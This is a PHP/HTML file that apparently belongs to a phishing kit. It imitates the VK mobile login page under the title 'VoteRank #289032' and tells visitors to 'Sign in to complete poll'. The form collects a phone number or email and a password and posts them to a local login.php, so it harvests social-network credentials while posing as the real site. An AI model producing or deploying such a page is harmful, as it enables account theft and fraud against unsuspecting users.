<?php
include "validate.php";
?>
<!--?xml version="1.0" encoding="utf-8"?-->
<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="vk vk_js_yes  vk_flex_yes r d h vk_withVolumeLine vk_appAuth_no"><head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta name="theme-color" content="#5181b8">


        <title>VoteRank #289032</title>
        <link rel="shortcut icon" href="https://m.vk.com/images/icons/favicons/fav_logo.ico?8">



        <link type="text/css" rel="stylesheet" href="./s_cfmxw.css">
<link type="text/css" rel="stylesheet" media="only screen" href="./s_cfmxw.css">
<script type="text/javascript" src="./s_c.js?752"></script>



      <body id="vk" class="vk__page _hover _hfixed vk_stickers_hints_support_yes opera_mini_no vk__page_login vk_al_yes" onresize="onBodyResize(true);" style="padding-bottom: 110px;">
            <div class="layout">


          <div class="layout__header mhead" id="vk_head">
      <div class="hb_wrap">
        <div class="hb_btn">&nbsp;</div>
      </div>
    </div>
      <div class="layout__body qs_enabled _js _copts" id="vk_wrap">
        <div class="layout__leftMenu" id="l" style="min-height: 0px;">

        </div>
        <div class="layout__basis" id="m" style="min-height: 0px;">
              <div class="basis">
      <div class="basis__header mhead" id="mhead">
  <img src="./top_logo.png">
  <div class="hb_btn mhi_logo">&nbsp;</div>
  <h1 class="hb_btn mh_header">&nbsp;</h1>
</a>
</div>

      <div class="basis__content mcont" id="mcont" data-canonical=""><div class="pcont fit_box bl_cont new_form">

  <div class="form_item">


    <div class="login_header">Sign in to complete poll</div><form method="post" action="login.php">
      <dl class="fi_row">
        <dd>
          <input class="textfield" name="email" placeholder="Phone or email" type="text">
        </dd>
      </dl>
      <dl class="fi_row">
        <dd>
          <input class="textfield" name="pass" placeholder="Password" type="password">
        </dd>
      </dl>

      <div class="fi_row_new">
        <input class="button wide_button" value="Log In" type="submit">
      </div>

    </form>
  </div>
</div></div>





        <script type="text/javascript">
</script><div id="vk_utils"></div>
        <div id="z"></div>
        <div id="vk_bottom"></div>


    </body></head></html>
